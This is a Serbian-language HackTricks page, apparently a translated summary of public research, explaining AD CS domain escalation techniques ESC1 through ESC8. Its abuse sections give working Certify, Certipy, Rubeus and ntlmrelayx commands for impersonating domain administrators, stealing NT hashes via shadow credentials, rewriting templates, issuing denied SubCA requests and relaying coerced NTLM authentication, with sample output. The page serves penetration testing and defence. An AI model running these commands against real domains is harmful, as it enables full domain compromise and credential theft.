# AD CS Domain Escalation

{{#include ../../../banners/hacktricks-training.md}}


**Ovo je sažetak odeljaka o tehnikama eskalacije iz sledećih postova:**

- [https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)<sup>[[6]](#references)</sup>
- [https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)<sup>[[7]](#references)</sup>
- [https://github.com/ly4k/Certipy](https://github.com/ly4k/Certipy)

## Misconfigured Certificate Templates - ESC1

### Objašnjenje

### Objašnjenje pogrešno konfigurisanih Certificate Templates - ESC1

- **Enterprise CA dodeljuje prava za upisivanje korisnicima sa niskim privilegijama.**
- **Odobrenje menadžera nije potrebno.**
- **Potpisi ovlašćenog osoblja nisu potrebni.**
- **Security descriptors na Certificate Templates su previše dozvoljavajući, što korisnicima sa niskim privilegijama omogućava da dobiju prava za upisivanje.**
- **Certificate Templates su konfigurisani tako da definišu EKU-ove koji olakšavaju authentication:**
- Uključeni su identifikatori Extended Key Usage (EKU), kao što su Client Authentication (OID 1.3.6.1.5.5.7.3.2), PKINIT Client Authentication (1.3.6.1.5.2.3.4), Smart Card Logon (OID 1.3.6.1.4.1.311.20.2.2), Any Purpose (OID 2.5.29.37.0) ili bez EKU-a (SubCA).
- **Template dozvoljava podnosiocima zahteva da uključe subjectAltName u Certificate Signing Request (CSR):**
- Active Directory (AD) daje prednost subjectAltName (SAN) vrednosti u certificate-u prilikom provere identiteta, ako je prisutna. To znači da se navođenjem SAN-a u CSR-u može zatražiti certificate za impersonaciju bilo kog korisnika (npr. domain administrator-a). Da li requester može da navede SAN određuje se u AD objektu Certificate Template-a, kroz svojstvo `mspki-certificate-name-flag`. Ovo svojstvo je bitmask, a prisustvo `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` flag-a omogućava requester-u da navede SAN.

> [!CAUTION]
> Opisana konfiguracija omogućava korisnicima sa niskim privilegijama da zahtevaju certificate-ove sa bilo kojim SAN-om po izboru, čime se omogućava authentication kao bilo koji domain principal putem Kerberos-a ili SChannel-a.

Ova funkcija se ponekad omogućava radi podrške generisanju HTTPS ili host certificate-ova u hodu, koje obavljaju proizvodi ili deployment services, ili zbog nedovoljnog razumevanja.

Napominje se da kreiranje certificate-a sa ovom opcijom pokreće upozorenje, što nije slučaj kada se postojeći Certificate Template (kao što je `WebServer` template, koji ima omogućen `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`) duplicira i zatim izmeni tako da uključuje authentication OID.<sup>[[6]](#references)</sup>

### Zloupotreba

Da biste **pronašli ranjive Certificate Templates**, možete pokrenuti:
```bash
Certify.exe find /vulnerable
certipy find -username john@corp.local -password Passw0rd -dc-ip 172.16.126.128
```
Da bi se **ova ranjivost zloupotrebila za impersonaciju administratora**, može se pokrenuti:
```bash
# Impersonate by setting SAN to a target principal (UPN or sAMAccountName)
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator@corp.local

# Optionally pin the target's SID into the request (post-2022 SID mapping aware)
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator /sid:S-1-5-21-1111111111-2222222222-3333333333-500

# Some CAs accept an otherName/URL SAN attribute carrying the SID value as well
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator \
/url:tag:microsoft.com,2022-09-14:sid:S-1-5-21-1111111111-2222222222-3333333333-500

# Certipy equivalent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' \
-template 'ESC1' -upn 'administrator@corp.local'
```
Zatim možete konvertovati generisani **sertifikat u `.pfx`** format i ponovo ga koristiti za **autentikaciju pomoću Rubeus ili certipy**:<sup>[[5]](#references)</sup>
```bash
Rubeus.exe asktgt /user:localdomain /certificate:localadmin.pfx /password:password123! /ptt
certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'corp.local' -dc-ip 172.16.19.100
```
Windows binarni fajlovi "Certreq.exe" i "Certutil.exe" mogu se koristiti za generisanje PFX-a: https://gist.github.com/b4cktr4ck2/95a9b908e57460d9958e8238f85ef8ee

Enumerisanje certificate template-a unutar konfiguracione šeme AD Forest-a, konkretno onih koji ne zahtevaju odobrenje ili potpise, poseduju Client Authentication ili Smart Card Logon EKU i imaju omogućen `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` flag, može se izvršiti pokretanjem sledećeg LDAP upita:
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2)(pkiextendedkeyusage=1.3.6.1.5.2.3.4)(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*)))(mspkicertificate-name-flag:1.2.840.113556.1.4.804:=1))
```
## Pogrešno konfigurisani predlošci sertifikata - ESC2

### Objašnjenje

Drugi scenario zloupotrebe predstavlja varijaciju prvog:

1. Enterprise CA dodeljuje prava za enrollment korisnicima sa niskim privilegijama.
2. Zahtev za odobrenje menadžera je onemogućen.
3. Zahtev za autorizovanim potpisima je izostavljen.
4. Previše permisivan security descriptor na predlošku sertifikata dodeljuje korisnicima sa niskim privilegijama prava za enrollment sertifikata.
5. **Predložak sertifikata je definisan tako da uključuje Any Purpose EKU ili da nema EKU.**

**Any Purpose EKU** omogućava napadaču da dobije sertifikat za **bilo koju svrhu**, uključujući client authentication, server authentication, code signing itd. Ista **technique korišćena za ESC3** može se upotrebiti za iskorišćavanje ovog scenarija.

Sertifikati **bez EKU-ova**, koji funkcionišu kao subordinate CA sertifikati, mogu se iskoristiti za **bilo koju svrhu** i **takođe mogu da se koriste za potpisivanje novih sertifikata**. Stoga bi napadač mogao da navede proizvoljne EKU-ove ili polja u novim sertifikatima koristeći subordinate CA sertifikat.

Međutim, novi sertifikati kreirani za **domain authentication** neće funkcionisati ako subordinate CA nije pouzdan za objekat **`NTAuthCertificates`**, što je podrazumevana postavka. Ipak, napadač i dalje može da kreira **nove sertifikate sa bilo kojim EKU-om** i proizvoljnim vrednostima sertifikata. Oni bi potencijalno mogli biti **zloupotrebljeni** u širokom opsegu svrha (npr. code signing, server authentication itd.) i mogli bi imati značajne posledice po druge aplikacije u mreži, kao što su SAML, AD FS ili IPSec.<sup>[[6]](#references)</sup>

Za enumeraciju predložaka koji odgovaraju ovom scenariju u okviru konfiguracione šeme AD Forest-a, može se pokrenuti sledeći LDAP upit:
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*))))
```
## Pogrešno konfigurisani Enrollment Agent Template-i - ESC3

### Objašnjenje

Ovaj scenario je sličan prvom i drugom, ali **zloupotrebljava** **drugačiji EKU** (Certificate Request Agent) i **2 različita template-a** (zbog toga ima 2 skupa zahteva),

**Certificate Request Agent EKU** (OID 1.3.6.1.4.1.311.20.2.1), poznat kao **Enrollment Agent** u Microsoft dokumentaciji, omogućava principalu da se **enroll-uje** za **certificate** **u ime drugog korisnika**.

**„Enrollment agent“** se **enroll-uje** u takav **template** i koristi dobijeni **certificate da potpiše CSR zajedno sa drugim potpisom u ime drugog korisnika**. Zatim **šalje** **CSR sa dodatnim potpisom** CA-u, enroll-ujući se u **template** koji **dozvoljava „enroll on behalf of“**, a CA odgovara sa **certificate-om koji pripada „drugom“ korisniku**.<sup>[[6]](#references)</sup>

**Zahtevi 1:**

- Enterprise CA dodeljuje prava za enrollment korisnicima sa niskim privilegijama.
- Zahtev za odobrenje menadžera je izostavljen.
- Ne postoji zahtev za autorizovanim potpisima.
- Security descriptor certificate template-a je previše permisivan, čime korisnicima sa niskim privilegijama dodeljuje prava za enrollment.
- Certificate template uključuje Certificate Request Agent EKU, čime omogućava zahtevanje drugih certificate template-a u ime drugih principala.

**Zahtevi 2:**

- Enterprise CA dodeljuje prava za enrollment korisnicima sa niskim privilegijama.
- Odobrenje menadžera je zaobiđeno.
- Schema version template-a je ili 1 ili veća od 2, i navodi Application Policy Issuance Requirement koji zahteva Certificate Request Agent EKU.
- EKU definisan u certificate template-u dozvoljava domain authentication.
- Ograničenja za enrollment agente nisu primenjena na CA.

### Zloupotreba

Možete koristiti [**Certify**](https://github.com/GhostPack/Certify) ili [**Certipy**](https://github.com/ly4k/Certipy) za zloupotrebu ovog scenarija:<sup>[[4]](#references)</sup>
```bash
# Request an enrollment agent certificate
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:Vuln-EnrollmentAgent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local' -ca 'corp-CA' -template 'templateName'

# Enrollment agent certificate to issue a certificate request on behalf of
# another user to a template that allow for domain authentication
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:User /onbehalfof:CORP\itadmin /enrollment:enrollmentcert.pfx /enrollcertpwd:asdf
certipy req -username john@corp.local -password Pass0rd! -target-ip ca.corp.local -ca 'corp-CA' -template 'User' -on-behalf-of 'corp\administrator' -pfx 'john.pfx'

# Use Rubeus with the certificate to authenticate as the other user
Rubeu.exe asktgt /user:CORP\itadmin /certificate:itadminenrollment.pfx /password:asdf
```
Korisnici kojima je dozvoljeno da dobiju **enrollment agent certificate**, šabloni u kojima je **enrollment agents** dozvoljeno da obavljaju enrollment i **accounts** u čije ime enrollment agent može da deluje mogu biti ograničeni enterprise CA-ovima. To se postiže otvaranjem `certsrc.msc` **snap-in** komponente, **desnim klikom na CA**, **klikom na Properties**, a zatim **odlaskom** na karticu „Enrollment Agents“.

Međutim, napominje se da je **podrazumevana** postavka za CA-ove „**Do not restrict enrollment agents**“. Kada administratori omoguće ograničenje enrollment agents, tako što ga postave na „Restrict enrollment agents“, podrazumevana konfiguracija i dalje ostaje izuzetno permisivna. Ona omogućava grupi **Everyone** da obavi enrollment u svim šablonima kao bilo ko.

## Kontrola pristupa ranjivim Certificate Template-ima - ESC4

### **Objašnjenje**

**Security descriptor** na **certificate templates** definiše **permissions** koje određeni **AD principals** poseduju u vezi sa šablonom.

Ako **attacker** poseduje potrebne **permissions** za **izmenu** **template-a** i **uvođenje** bilo kakvih **exploitable misconfigurations** opisanih u **prethodnim odeljcima**, može doći do privilege escalation-a.

Značajne permissions primenljive na certificate templates uključuju:<sup>[[6]](#references)</sup>

- **Owner:** Dodeljuje implicitnu kontrolu nad objektom, omogućavajući izmenu bilo kojih atributa.
- **FullControl:** Omogućava potpunu kontrolu nad objektom, uključujući mogućnost izmene bilo kojih atributa.
- **WriteOwner:** Dozvoljava izmenu vlasnika objekta u principal-a pod kontrolom attackera.
- **WriteDacl:** Omogućava podešavanje kontrola pristupa, čime se attacker-u potencijalno dodeljuje FullControl.
- **WriteProperty:** Omogućava izmenu bilo kojih svojstava objekta.

### Abuse

Da biste identifikovali principal-e sa pravima izmene nad template-ima i drugim PKI objektima, izvršite enumeraciju pomoću Certify:
```bash
Certify.exe find /showAllPermissions
Certify.exe pkiobjects /domain:corp.local /showAdmins
```
Primer privesc-a kao u prethodnom primeru:

<figure><img src="../../../images/image (814).png" alt=""><figcaption></figcaption></figure>

ESC4 je situacija u kojoj korisnik ima privilegije pisanja nad predloškom sertifikata. To se, na primer, može zloupotrebiti za prepisivanje konfiguracije predloška sertifikata, čime se predložak čini ranjivim na ESC1.

Kao što možemo videti na putanji iznad, samo `JOHNPC` ima ove privilegije, ali naš korisnik `JOHN` ima novu `AddKeyCredentialLink` vezu ka `JOHNPC`. Pošto je ova tehnika povezana sa sertifikatima, implementirao sam i ovaj napad, koji je poznat kao [Shadow Credentials](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab).<sup>[[8]](#references)</sup> Evo kratkog pregleda Certipy-jeve komande `shadow auto` za preuzimanje NT hash-a žrtve.
```bash
certipy shadow auto 'corp.local/john:Passw0rd!@dc.corp.local' -account 'johnpc'
```
**Certipy** može jednom komandom da prepiše konfiguraciju certificate template-a. **Podrazumevano**, Certipy će **prepisati** konfiguraciju tako da postane **vulnerable to ESC1**. Takođe možemo navesti **`-save-old` parametar za čuvanje stare konfiguracije**, što će biti korisno za **vraćanje** konfiguracije nakon našeg napada.
```bash
# Make template vuln to ESC1
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -save-old

# Exploit ESC1
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template ESC4-Test -upn administrator@corp.local

# Restore config
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -configuration ESC4-Test.json
```
## Kontrola pristupa ranjivim PKI objektima - ESC5

### Objašnjenje

Opsežna mreža međusobno povezanih odnosa zasnovanih na ACL-ovima, koja obuhvata nekoliko objekata pored certificate templates i certificate authority, može uticati na bezbednost celokupnog AD CS sistema. Ovi objekti, koji mogu značajno uticati na bezbednost, obuhvataju:

- AD computer object CA servera, koji može biti kompromitovan mehanizmima kao što su S4U2Self ili S4U2Proxy.
- RPC/DCOM server CA servera.
- Bilo koji descendant AD object ili container unutar određene putanje containera `CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>`. Ova putanja obuhvata, između ostalog, containere i objekte kao što su Certificate Templates container, Certification Authorities container, NTAuthCertificates object i Enrollment Services Container.

Bezbednost PKI sistema može biti ugrožena ako napadač sa niskim privilegijama uspe da preuzme kontrolu nad bilo kojom od ovih kritičnih komponenti.<sup>[[6]](#references)</sup>

## EDITF_ATTRIBUTESUBJECTALTNAME2 - ESC6

### Objašnjenje

Tema obrađena u [**CQure Academy postu**](https://cqureacademy.com/blog/enhanced-key-usage) takođe se bavi posledicama **`EDITF_ATTRIBUTESUBJECTALTNAME2`** flag-a, kako ih je definisao Microsoft. Ova konfiguracija, kada je aktivirana na Certification Authority (CA), dozvoljava uključivanje **vrednosti koje definiše korisnik** u **subject alternative name** za **bilo koji zahtev**, uključujući one konstruisane iz Active Directory®. Posledično, ova mogućnost omogućava **napadaču** da se upiše preko **bilo kog template-a** podešenog za **domain authentication** — konkretno onih koji dozvoljavaju upis **neprivilegovanih** korisnika, kao što je standardni User template. Kao rezultat toga, moguće je pribaviti certificate koji napadaču omogućava autentifikaciju kao domain administrator ili **bilo koji drugi aktivni entitet** unutar domena.<sup>[[9]](#references)</sup>

**Napomena**: Pristup dodavanja **alternative names** u Certificate Signing Request (CSR), pomoću argumenta `-attrib "SAN:"` u `certreq.exe` (koji se naziva „Name Value Pairs“), razlikuje se od strategije iskorišćavanja SAN-ova u ESC1. Razlika je u tome **kako su informacije o nalogu enkapsulirane** — unutar certificate attribute-a, a ne extension-a.

### Zloupotreba

Da bi proverile da li je podešavanje aktivirano, organizacije mogu da koriste sledeću komandu sa `certutil.exe`:
```bash
certutil -config "CA_HOST\CA_NAME" -getreg "policy\EditFlags"
```
Ova operacija u suštini koristi **udaljeni pristup registru**, stoga bi alternativni pristup mogao biti:
```bash
reg.exe query \\<CA_SERVER>\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\<CA_NAME>\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\ /v EditFlags
```
Alati kao što su [**Certify**](https://github.com/GhostPack/Certify) i [**Certipy**](https://github.com/ly4k/Certipy) mogu da otkriju ovu pogrešnu konfiguraciju i iskoriste je:<sup>[[4]](#references)</sup>
```bash
# Detect vulnerabilities, including this one
Certify.exe find

# Exploit vulnerability
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:User /altname:localadmin
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template User -upn administrator@corp.local
```
Za izmenu ovih postavki, pod pretpostavkom da posedujete **administrativna prava domena** ili ekvivalentna prava, sledeća komanda može da se izvrši sa bilo koje radne stanice:
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2
```
Da biste onemogućili ovu konfiguraciju u svom okruženju, flag se može ukloniti pomoću:
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2
```
> [!WARNING]
> Nakon bezbednosnih ažuriranja iz maja 2022. godine, novoizdati **certifikati** sadržavaće **security extension** koja uključuje svojstvo **`objectSid` podnosioca zahteva**. Kod ESC1, ovaj SID se izvodi iz navedenog SAN-a. Međutim, kod **ESC6**, SID odražava **`objectSid` podnosioca zahteva**, a ne SAN.\
> Da bi se ESC6 mogao iskoristiti, neophodno je da sistem bude podložan na ESC10 (Weak Certificate Mappings), koji daje prednost **SAN-u u odnosu na novu security extension**.

## Kontrola pristupa ranjivom Certificate Authority-u - ESC7

### Attack 1

#### Objašnjenje

Kontrola pristupa Certificate Authority-u održava se pomoću skupa dozvola koje uređuju CA radnje. Ove dozvole mogu se pregledati pristupom `certsrv.msc`, desnim klikom na CA, izborom svojstava, a zatim prelaskom na karticu Security. Pored toga, dozvole se mogu enumerisati pomoću PSPKI modula, koristeći komande kao što su:
```bash
Get-CertificationAuthority -ComputerName dc.domain.local | Get-CertificationAuthorityAcl | select -expand Access
```
Ovo pruža uvid u primarna prava, odnosno **`ManageCA`** i **`ManageCertificates`**, koja odgovaraju ulogama „CA administrator“ i „Certificate Manager“, redom.<sup>[[6]](#references)</sup>

#### Zloupotreba

Posedovanje prava **`ManageCA`** nad sertifikacionim autoritetom omogućava principalu da daljinski menja podešavanja koristeći PSPKI. Ovo uključuje uključivanje oznake **`EDITF_ATTRIBUTESUBJECTALTNAME2`** kako bi se dozvolilo navođenje SAN-a u bilo kom template-u, što predstavlja ključni aspekt domain escalation.

Ovaj proces se može pojednostaviti korišćenjem PSPKI cmdlet-a **Enable-PolicyModuleFlag**, koji omogućava izmene bez direktne interakcije sa GUI-jem.

Posedovanje prava **`ManageCertificates`** omogućava odobravanje zahteva na čekanju, čime se efektivno zaobilazi zaštita „CA certificate manager approval“.

Kombinacija modula **Certify** i **PSPKI** može se koristiti za podnošenje zahteva, odobravanje i preuzimanje sertifikata:
```bash
# Request a certificate that will require an approval
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:ApprovalNeeded
[...]
[*] CA Response      : The certificate is still pending.
[*] Request ID       : 336
[...]

# Use PSPKI module to approve the request
Import-Module PSPKI
Get-CertificationAuthority -ComputerName dc.domain.local | Get-PendingRequest -RequestID 336 | Approve-CertificateRequest

# Download the certificate
Certify.exe download /ca:dc.domain.local\theshire-DC-CA /id:336
```
### Napad 2

#### Objašnjenje

> [!WARNING]
> U **prethodnom napadu** su dozvole **`Manage CA`** korišćene za **omogućavanje** zastavice **EDITF_ATTRIBUTESUBJECTALTNAME2** radi izvođenja **ESC6 napada**, ali to neće imati nikakav efekat dok se CA servis (`CertSvc`) ne restartuje. Kada korisnik ima pravo pristupa **`Manage CA`**, korisniku je takođe dozvoljeno da **restartuje servis**. Međutim, to **ne znači da korisnik može da restartuje servis na daljinu**. Pored toga, **ESC6 možda neće raditi odmah** u većini zakrpljenih okruženja zbog bezbednosnih ažuriranja iz maja 2022. godine.

Zbog toga je ovde predstavljen drugi napad.

Preduslovi:

- Samo dozvola **`ManageCA`**
- Dozvola **`Manage Certificates`** (može se dodeliti iz **`ManageCA`**)
- Certificate template **`SubCA`** mora biti **omogućen** (može se omogućiti iz **`ManageCA`**)

Tehnika se oslanja na činjenicu da korisnici sa pravima pristupa `Manage CA` _i_ `Manage Certificates` mogu da **izdaju neuspešne zahteve za sertifikat**. Certificate template **`SubCA`** je **vulnerable to ESC1**, ali samo **administratori** mogu da se upišu u template. Dakle, **korisnik** može da **zatraži** upis u **`SubCA`**, što će biti **odbijeno**, ali će ga **menadžer naknadno izdati**.<sup>[[6]](#references)</sup>

#### Zloupotreba

Možete sebi **dodeliti pravo pristupa `Manage Certificates`** tako što ćete dodati svog korisnika kao novog službenika.
```bash
certipy ca -ca 'corp-DC-CA' -add-officer john -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully added officer 'John' on 'corp-DC-CA'
```
**`SubCA`** šablon može biti **omogućen na CA** pomoću parametra `-enable-template`. Podrazumevano, `SubCA` šablon je omogućen.
```bash
# List templates
certipy ca -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' -enable-template 'SubCA'
## If SubCA is not there, you need to enable it

# Enable SubCA
certipy ca -ca 'corp-DC-CA' -enable-template SubCA -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully enabled 'SubCA' on 'corp-DC-CA'
```
Ako smo ispunili preduslove za ovaj napad, možemo početi **zahtevanjem sertifikata na osnovu `SubCA` šablona**.

**Ovaj zahtev će biti odbijen**, ali ćemo sačuvati privatni ključ i zabeležiti ID zahteva.
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template SubCA -upn administrator@corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
[*] Request ID is 785
Would you like to save the private key? (y/N) y
[*] Saved private key to 785.key
[-] Failed to request certificate
```
Sa našim **`Manage CA` i `Manage Certificates`**, zatim možemo **izdati neuspešni zahtev za sertifikat** pomoću komande `ca` i parametra `-issue-request <request ID>`.
```bash
certipy ca -ca 'corp-DC-CA' -issue-request 785 -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully issued certificate
```
I na kraju, možemo da **preuzmemo izdati sertifikat** pomoću komande `req` i parametra `-retrieve <request ID>`.
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -retrieve 785
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Rerieving certificate with ID 785
[*] Successfully retrieved certificate
[*] Got certificate with UPN 'administrator@corp.local'
[*] Certificate has no object SID
[*] Loaded private key from '785.key'
[*] Saved certificate and private key to 'administrator.pfx'
```
### Attack 3 – Abuse ekstenzije Manage Certificates (SetExtension)

#### Objašnjenje

Pored klasičnih ESC7 zloupotreba (omogućavanje EDITF atributa ili odobravanje zahteva na čekanju), **Certify 2.0** je otkrio potpuno novi primitive koji zahteva samo ulogu *Manage Certificates* (poznatu i kao **Certificate Manager / Officer**) na Enterprise CA.<sup>[[3]](#references)</sup>

RPC metoda `ICertAdmin::SetExtension` može da se izvrši sa bilo kojim principalom koji poseduje *Manage Certificates*. Iako su legitimni CA-ovi ovu metodu tradicionalno koristili za ažuriranje ekstenzija na zahtevima koji su **na čekanju**, napadač može da je zloupotrebi kako bi **dodao *non-default* certificate extension** (na primer prilagođeni *Certificate Issuance Policy* OID kao što je `1.1.1.1`) zahtevu koji čeka odobrenje.

Pošto ciljani template **ne definiše podrazumevanu vrednost za tu ekstenziju**, CA neće zameniti vrednost koju je kontrolisao napadač kada zahtev naknadno bude izdat. Dobijeni sertifikat zato sadrži ekstenziju koju je izabrao napadač, što može:

* Ispuniti zahteve Application / Issuance Policy drugih ranjivih template-a (što dovodi do privilege escalation).
* Ubaciti dodatne EKU-ove ili policy-je koji sertifikatu daju neočekivano poverenje u sistemima trećih strana.

Ukratko, *Manage Certificates* – koji je ranije smatran „slabijom“ polovinom ESC7 – sada može da se iskoristi za potpunu privilege escalation ili dugoročnu persistence, bez menjanja CA konfiguracije i bez potrebe za restriktivnijom pravom *Manage CA*.

#### Zloupotreba primitive-a pomoću Certify 2.0

1. **Pošaljite certificate request koji će ostati *pending*.**  Ovo se može postići pomoću template-a koji zahteva odobrenje manager-a:
```powershell
Certify.exe request --ca SERVER\\CA-NAME --template SecureUser --subject "CN=User" --manager-approval
# Take note of the returned Request ID
```

2. **Dodajte prilagođenu ekstenziju zahtevu na čekanju** pomoću nove `manage-ca` komande:
```powershell
Certify.exe manage-ca --ca SERVER\\CA-NAME \
--request-id 1337 \
--set-extension "1.1.1.1=DER,10,01 01 00 00"  # fake issuance-policy OID
```
*Ako template već ne definiše ekstenziju *Certificate Issuance Policies*, prethodna vrednost će biti sačuvana nakon izdavanja.*

3. **Izdajte zahtev** (ako vaša uloga takođe ima prava odobravanja *Manage Certificates*) ili sačekajte da ga operator odobri. Kada bude izdat, preuzmite sertifikat:
```powershell
Certify.exe request-download --ca SERVER\\CA-NAME --id 1337
```

4. Dobijeni sertifikat sada sadrži zlonamerni issuance-policy OID i može da se koristi u narednim napadima (npr. ESC13, domain escalation itd.).

> NAPOMENA:  Isti napad može da se izvrši pomoću Certipy ≥ 4.7 kroz komandu `ca` i parametar `-set-extension`.

## NTLM Relay na AD CS HTTP Endpoint-e – ESC8

### Objašnjenje

> [!TIP]
> U okruženjima u kojima je **AD CS instaliran**, ako postoji **ranjivi web enrollment endpoint** i ako je objavljen najmanje jedan **certificate template** koji dozvoljava enrollment domain računara i client authentication (kao što je podrazumevani **`Machine`** template), **napadač može da kompromituje bilo koji računar sa aktivnom spooler service**!

AD CS podržava nekoliko **HTTP-based enrollment metoda**, koje su dostupne kroz dodatne server roles koje administratori mogu da instaliraju. Ovi interfejsi za HTTP-based certificate enrollment podložni su **NTLM relay napadima**. Napadač sa **kompromitovanog računara može da se predstavlja kao bilo koji AD nalog koji se autentifikuje putem inbound NTLM-a**. Dok se predstavlja kao žrtvin nalog, napadač može da pristupi ovim web interfejsima i **zatraži client authentication sertifikat koristeći `User` ili `Machine` certificate template-e**.

- **Web enrollment interface** (starija ASP aplikacija dostupna na `http://<caserver>/certsrv/`) podrazumevano koristi samo HTTP, koji ne pruža zaštitu od NTLM relay napada. Pored toga, eksplicitno dozvoljava samo NTLM authentication kroz svoj Authorization HTTP header, zbog čega bezbednije metode authentication-a, kao što je Kerberos, nisu primenljive.
- **Certificate Enrollment Service** (CES), **Certificate Enrollment Policy** (CEP) Web Service i **Network Device Enrollment Service** (NDES) podrazumevano podržavaju negotiate authentication kroz svoj Authorization HTTP header. Negotiate authentication podržava i Kerberos i **NTLM**, što napadaču omogućava da tokom relay napada **spusti authentication na NTLM**. Iako ovi web services podrazumevano omogućavaju HTTPS, sam HTTPS **ne štiti od NTLM relay napada**. Zaštita HTTPS services-a od NTLM relay napada moguća je samo kada se HTTPS kombinuje sa channel binding-om. Nažalost, AD CS ne aktivira Extended Protection for Authentication na IIS-u, što je neophodno za channel binding.<sup>[[6]](#references)</sup>

Uobičajen **problem** kod NTLM relay napada jeste **kratko trajanje NTLM sesija** i nemogućnost napadača da komunicira sa services-ima koji **zahtevaju NTLM signing**.

Ipak, ovo ograničenje se prevazilazi iskorišćavanjem NTLM relay napada za pribavljanje sertifikata za korisnika, pošto period važenja sertifikata određuje trajanje sesije, a sertifikat može da se koristi sa services-ima koji **zahtevaju NTLM signing**. Uputstva za korišćenje ukradenog sertifikata dostupna su ovde:


{{#ref}}
account-persistence.md
{{#endref}}

Drugo ograničenje NTLM relay napada jeste to što **računar pod kontrolom napadača mora da bude autentifikovan od strane naloga žrtve**. Napadač može ili da sačeka ili da pokuša da **iznudi** ovu authentication:


{{#ref}}
../printers-spooler-service-abuse.md
{{#endref}}

### **Abuse**

[**Certify**](https://github.com/GhostPack/Certify)’s `cas` enumeriše **omogućene HTTP AD CS endpoint-e**:<sup>[[4]](#references)</sup>
```
Certify.exe cas
```
<figure><img src="../../../images/image (72).png" alt=""><figcaption></figcaption></figure>

Svojstvo `msPKI-Enrollment-Servers` koriste enterprise Certificate Authorities (CA) za čuvanje krajnjih tačaka Certificate Enrollment Service (CES). Ove krajnje tačke mogu se analizirati i izlistati pomoću alata **Certutil.exe**:
```
certutil.exe -enrollmentServerURL -config DC01.DOMAIN.LOCAL\DOMAIN-CA
```
<figure><img src="../../../images/image (757).png" alt=""><figcaption></figcaption></figure>
```bash
Import-Module PSPKI
Get-CertificationAuthority | select Name,Enroll* | Format-List *
```
<figure><img src="../../../images/image (940).png" alt=""><figcaption></figcaption></figure>

#### Zloupotreba pomoću Certify
```bash
## In the victim machine
# Prepare to send traffic to the compromised machine 445 port to 445 in the attackers machine
PortBender redirect 445 8445
rportfwd 8445 127.0.0.1 445
# Prepare a proxy that the attacker can use
socks 1080

## In the attackers
proxychains ntlmrelayx.py -t http://<AC Server IP>/certsrv/certfnsh.asp -smb2support --adcs --no-http-server

# Force authentication from victim to compromised machine with port forwards
execute-assembly C:\SpoolSample\SpoolSample\bin\Debug\SpoolSample.exe <victim> <compromised>
```
#### Zloupotreba pomoću [Certipy](https://github.com/ly4k/Certipy)

Certipy podrazumevano šalje zahtev za sertifikat na osnovu template-a `Machine` ili `User`, u zavisnosti od toga da li se ime naloga koji se relay-uje završava znakom `$`. Navođenje alternativnog template-a moguće je pomoću parametra `-template`.

Tehnika poput [PetitPotam](https://github.com/ly4k/PetitPotam) zatim može da se upotrebi za primoravanje autentikacije. Kada su u pitanju kontroleri domena, neophodno je navesti `-template DomainController`.
```bash
certipy relay -ca ca.corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Targeting http://ca.corp.local/certsrv/certfnsh.asp
[*] Listening on 0.0.0.0:445
[*] Requesting certificate for 'CORP\\Administrator' based on the template 'User'
[*] Got certificate with UPN 'Administrator@corp.local'
[*] Certificate object SID is 'S-1-5-21-980154951-4172460254-2779440654-500'
